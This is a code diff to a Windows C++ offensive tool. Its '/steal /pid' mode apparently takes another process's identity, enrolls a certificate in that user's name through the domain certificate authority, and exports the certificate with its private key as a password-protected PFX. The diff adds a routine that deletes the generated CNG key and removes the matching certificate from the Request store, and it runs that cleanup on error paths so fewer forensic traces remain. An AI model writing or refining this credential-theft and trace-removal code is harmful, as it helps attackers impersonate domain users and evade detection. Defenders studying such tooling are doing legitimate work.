@@ -59,6 +59,64 @@ struct ComException : public std::runtime_error {
         : std::runtime_error(msg), hr(code) {}
 };
 
+BOOL DeleteKeyAndCleanupArtifact(LPCWSTR containerName, LPCWSTR providerName) {
+    if (!containerName || !providerName) return FALSE;
+
+    NCRYPT_PROV_HANDLE hProv = NULL;
+    NCRYPT_KEY_HANDLE hKey = NULL;
+
+    if (NCryptOpenStorageProvider(&hProv, providerName, 0) != ERROR_SUCCESS) return FALSE;
+    if (NCryptOpenKey(hProv, &hKey, containerName, 0, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS) {
+        NCryptFreeObject(hProv);
+        return FALSE;
+    }
+
+    DWORD certPubKeyLen = 0;
+    CryptExportPublicKeyInfoEx((HCRYPTPROV_OR_NCRYPT_KEY_HANDLE)hKey, CERT_NCRYPT_KEY_SPEC,
+        X509_ASN_ENCODING, (LPSTR)szOID_RSA_RSA, 0, NULL, NULL, &certPubKeyLen);
+
+    std::vector<BYTE> certPubKeyBuf(certPubKeyLen);
+    CERT_PUBLIC_KEY_INFO* pPubKeyInfo = reinterpret_cast<CERT_PUBLIC_KEY_INFO*>(certPubKeyBuf.data());
+
+    if (!CryptExportPublicKeyInfoEx((HCRYPTPROV_OR_NCRYPT_KEY_HANDLE)hKey, CERT_NCRYPT_KEY_SPEC,
+        X509_ASN_ENCODING, (LPSTR)szOID_RSA_RSA, 0, NULL, pPubKeyInfo, &certPubKeyLen)) {
+        LogMessage(L"[-] CryptExportPublicKeyInfoEx failed: 0x%x\n", GetLastError());
+        NCryptFreeObject(hKey);
+        NCryptFreeObject(hProv);
+        return FALSE;
+    }
+
+    HCERTSTORE hStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, NULL,
+        CERT_SYSTEM_STORE_CURRENT_USER | CERT_STORE_OPEN_EXISTING_FLAG, L"Request");
+    if (hStore) {
+        PCCERT_CONTEXT pArtifact = NULL;
+        int count = 0;
+        while ((pArtifact = CertFindCertificateInStore(hStore,
+            X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0,
+            CERT_FIND_PUBLIC_KEY, pPubKeyInfo, pArtifact)) != NULL) {
+            if (CertDeleteCertificateFromStore(CertDuplicateCertificateContext(pArtifact))) {
+                LogMessage(L"[+] Cleanup (early): Request store artifact removed.\n");
+                pArtifact = NULL;
+                count++;
+            }
+        }
+        if (count == 0) LogMessage(L"[*] Cleanup (early): no artifact found.\n");
+        CertCloseStore(hStore, 0);
+    }
+
+    SECURITY_STATUS s = NCryptDeleteKey(hKey, 0);
+    if (s != ERROR_SUCCESS) {
+        NCryptFreeObject(hKey);
+        NCryptFreeObject(hProv);
+        LogMessage(L"[-] NCryptDeleteKey failed: 0x%x\n", s);
+        return FALSE;
+    }
+
+    NCryptFreeObject(hProv);
+    LogMessage(L"[+] CNG key deleted.\n");
+    return TRUE;
+}
+
 inline void ThrowIfFailed(HRESULT hr, const char* msg) {
     if (FAILED(hr)) {
         char* sysMsg = nullptr;
@@ -326,6 +384,11 @@ BOOL GenerateCSR(const wchar_t* templateName, const wchar_t* email, BSTR* outCsr
         CComPtr<IX509PrivateKey> key;
         ThrowIfFailed(req->get_PrivateKey(&key), "get_PrivateKey");
         key->put_ExportPolicy(XCN_NCRYPT_ALLOW_EXPORT_FLAG);
+        ThrowIfFailed(key->Create(), "key->Create");
+
+        // Retrieving metadata from the container
+        ThrowIfFailed(key->get_ContainerName(&outContainerName), "get_ContainerName");
+        ThrowIfFailed(key->get_ProviderName(&outProviderName), "get_ProviderName");
 
         // Build Subject DN and embed it into the request
         CComPtr<IX500DistinguishedName> dn;
@@ -364,14 +427,12 @@ BOOL GenerateCSR(const wchar_t* templateName, const wchar_t* email, BSTR* outCsr
         ThrowIfFailed(enroll->InitializeFromRequest(req), "InitEnroll");
         ThrowIfFailed(enroll->CreateRequest(XCN_CRYPT_STRING_BASE64, outCsr), "CreateRequest");
 
-        // Retrieving metadata from the container
-        ThrowIfFailed(key->get_ContainerName(&outContainerName), "get_ContainerName");
-        ThrowIfFailed(key->get_ProviderName(&outProviderName), "get_ProviderName");
-
         return TRUE;
     }
     catch (std::exception& ex) {
         LogMessage(L"[-] GenerateCSR Error: %S\n", ex.what());
+        if (outContainerName.m_str && outProviderName.m_str)
+            DeleteKeyAndCleanupArtifact(outContainerName, outProviderName);
         return FALSE;
     }
 }
@@ -561,7 +622,6 @@ void OutputData(const std::vector<BYTE>& data, const std::wstring& password) {
     }
 }
 
-
 BOOL ResolveCaConfig(const std::wstring& input, std::wstring& outConfig) {
     std::wstring wantedHost, wantedCa;
     BOOL autoPick = input.empty();
@@ -674,15 +734,18 @@ BOOL PerformCertEnroll(const wchar_t* templateName, const wchar_t* caName, const
         if (SubmitToCA(resolvedCa.c_str(), csr, &certB64)) {
             if (CreatePFXInMemory(certB64, bstrContainerName, bstrProviderName, password, pfxData, &pCleanupCert)) {
                 OutputData(pfxData, password);
-
-                if (pCleanupCert) {
-                    DeleteKeyMaterial(pCleanupCert);
-                    RemoveRequestArtifactByPublicKey(pCleanupCert);
-                    CertFreeCertificateContext(pCleanupCert);
-                }
-
                 success = TRUE;
             }
+        }
+
+        if (pCleanupCert) {
+            DeleteKeyMaterial(pCleanupCert);
+            RemoveRequestArtifactByPublicKey(pCleanupCert);
+            CertFreeCertificateContext(pCleanupCert);
+            pCleanupCert = NULL;
+        }
+        else {
+            DeleteKeyAndCleanupArtifact(bstrContainerName, bstrProviderName);
         }
     }
 
@@ -726,7 +789,6 @@ void PrintUsage(const wchar_t* exe) {
     wprintf(L"  %s /steal /pid:<PID> /template:<Template> /pass:<password> [/ca:<CA>] [/email:<email>] [/outfile:<file>]\n", exe);
 }
 
-
 BOOL ValidateCaArgument(const std::wstring& ca) {
     if (ca.empty()) return TRUE; // empty = auto-pick mode (enumeration)
     if (ca.find_first_of(L" \t\r\n\"") != std::wstring::npos) return FALSE;
@@ -736,7 +798,6 @@ BOOL ValidateCaArgument(const std::wstring& ca) {
     if (ca.find(L'\\', pos + 1) != std::wstring::npos) return FALSE;   // exactly one '\'
     return TRUE;
 }
-
 
 int wmain(int argc, wchar_t* argv[]) {
     if (argc < 2) {
@@ -766,8 +827,6 @@ int wmain(int argc, wchar_t* argv[]) {
         return 0;
     }
 
-
-
     if (doSteal) {
         if (pid == 0 || tmpl.empty() || pass.empty()) {
             LogMessage(L"[-] Missing arguments for /steal.\n");
@@ -775,11 +834,11 @@ int wmain(int argc, wchar_t* argv[]) {
             return 1;
         }
         if (!ValidateCaArgument(ca)) {
-            LogMessage(L"[-] Invalid /ca format. Expected 'HOST\\CAName'.\n");
+            LogMessage(L"[-] Invalid ca format. Expected 'HOST\\CAName'.\n");
             return 1;
         }
         if (ca.empty()) {
-            LogMessage(L"[*] No /ca specified - auto-resolution mode.\n");
+            LogMessage(L"[*] No ca specified - auto-resolution mode.\n");
         }
         if (!StealAndEnroll(pid, (wchar_t*)tmpl.c_str(), (wchar_t*)ca.c_str(),
             (wchar_t*)pass.c_str(), (wchar_t*)email.c_str())) {
